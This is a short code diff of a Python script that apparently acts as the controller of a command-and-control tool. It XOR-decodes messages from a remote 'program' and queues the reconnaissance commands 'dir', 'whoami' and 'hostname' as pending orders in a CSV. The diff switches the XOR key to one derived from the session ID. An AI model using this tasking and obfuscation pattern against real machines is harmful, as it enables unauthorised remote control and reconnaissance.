@@ -136,7 +136,7 @@ def get_data_from_program(json):
 
     string_received = "".join(list_message_received)
 
-    xor_byte = ord("a")
+    xor_byte = ord(json["sessionID"][0])
 
     xor_received = "".join([chr(ord(cs) ^ xor_byte) for cs in string_received])
 
@@ -158,7 +158,7 @@ def find_desired_order(file_path_command):
 
     if file_path_command not in os.listdir():
         # creation of the csv of the desired order with random value
-        df = pd.DataFrame(data={"order":[5, 5, 6], "additional_data":["dir", "whoami", "hostname"], "state":["waiting", "waiting", "waiting"]})
+        df = pd.DataFrame(data={"order":[5, 5, 6], "additional_data":["dir", "whoami", ""], "state":["waiting", "waiting", "waiting"]})
         print(df)
         df.to_csv(file_path_command, index=False)
 
